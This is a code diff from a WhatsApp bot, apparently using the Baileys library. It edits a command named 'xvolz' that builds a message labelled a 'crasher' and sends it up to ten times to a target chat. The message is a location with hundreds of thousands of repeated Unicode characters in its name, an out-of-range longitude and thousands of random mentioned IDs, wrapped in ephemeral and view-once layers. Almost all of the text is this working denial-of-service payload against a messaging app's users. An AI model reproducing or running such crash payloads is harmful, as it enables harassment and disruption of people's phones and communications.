@@ -66,6 +66,7 @@ END:VCARD`;
 case "xvolz": {
   try {
     const target = m.key.remoteJid;
+    const count = Math.min(Number(args[0]) || 1, 10); // maksimal 10x
 
     const fuckRexzSuki = {
       key: {
@@ -79,63 +80,63 @@ case "xvolz": {
       pushName: "©RexzSuki"
     };
 
-function generateRandomLids(count = 2025) {
-  const lids = new Set();
-  while (lids.size < count) {
-    const randomNum = Math.floor(Math.random() * 1e15).toString().padStart(15, '0');
-    lids.add(randomNum + "@lid");
-  }
-  return Array.from(lids);
-}
-
-function mentionJid() {
-  return generateRandomLids();
-}
-
-const locationMsg = proto.Message.LocationMessage.fromObject({
-  degreesLatitude: -9.09165299926,
-  degreesLongitude: 199.197369996311,
-  name: "㑒 ⏤𝐑𝐞𝐱𝐳𝐂𝐫𝐚𝐬𝐡𝐞ʳ🕊️\n" + "ꦾ".repeat(252525),
-  address: "",
-  url: "https://㑒 ⏤𝐑𝐞𝐱𝐳𝐂𝐫𝐚𝐬𝐡𝐞ʳ🕊️ " + "ꦃ".repeat(35) + ".crasher",
-  isLive: true,
-  accuracyInMeters: 252525,
-  jpegThumbnail: null,
-  contextInfo: {
-    forwardingScore: 252525,
-    isForwarded: true,
-    mentionedJid: mentionJid(),
-    externalAdReply: {
-      mediaType: 2,
-      title: "",
-      body: "",
-      mediaUrl: "",
-      thumbnail: null
+    function generateRandomLids(count = 2025) {
+      const lids = new Set();
+      while (lids.size < count) {
+        const randomNum = Math.floor(Math.random() * 1e15).toString().padStart(15, '0');
+        lids.add(randomNum + "@lid");
+      }
+      return Array.from(lids);
     }
-  }
-});
 
-const msgContent = {
-  ephemeralMessage: {
-    message: {
-      viewOnceMessageV2: {
-        message: {
-          locationMessage: locationMsg
+    function mentionJid() {
+      return generateRandomLids();
+    }
+
+    const locationMsg = proto.Message.LocationMessage.fromObject({
+      degreesLatitude: -9.09165299926,
+      degreesLongitude: 199.197369996311,
+      name: "㑒 ⏤𝐑𝐞𝐱𝐳𝐂𝐫𝐚𝐬𝐡𝐞ʳ🕊️\n" + "ꦾ".repeat(252525),
+      address: "",
+      url: "https://㑒 ⏤𝐑𝐞𝐱𝐳𝐂𝐫𝐚𝐬𝐡𝐞ʳ🕊️ " + "ꦃ".repeat(35) + ".crasher",
+      isLive: true,
+      accuracyInMeters: 252525,
+      jpegThumbnail: null,
+      contextInfo: {
+        forwardingScore: 252525,
+        isForwarded: true,
+        mentionedJid: mentionJid(),
+        externalAdReply: {
+          mediaType: 2,
+          title: "",
+          body: "",
+          mediaUrl: "",
+          thumbnail: null
         }
       }
-    },
-    ephemeralExpiration: 252525
-  }
-};
-
-    const msg = generateWAMessageFromContent(target, msgContent, {
-      userJid: sock.user.id,
-      quoted: fuckRexzSuki
     });
 
-    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
+    const msgContent = {
+      ephemeralMessage: {
+        message: {
+          viewOnceMessageV2: {
+            message: {
+              locationMessage: locationMsg
+            }
+          }
+        },
+        ephemeralExpiration: 252525
+      }
+    };
 
-    console.log("xvolz nested forwarded location sent:", msg.key.id);
+    for (let i = 0; i < count; i++) {
+      const msg = generateWAMessageFromContent(target, msgContent, {
+        userJid: sock.user.id,
+        quoted: fuckRexzSuki
+      });
+      await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
+      console.log(`xvolz nested forwarded location sent: ${i + 1}/${count}`);
+    }
 
   } catch (err) {
     console.error("xvolz error:", err);
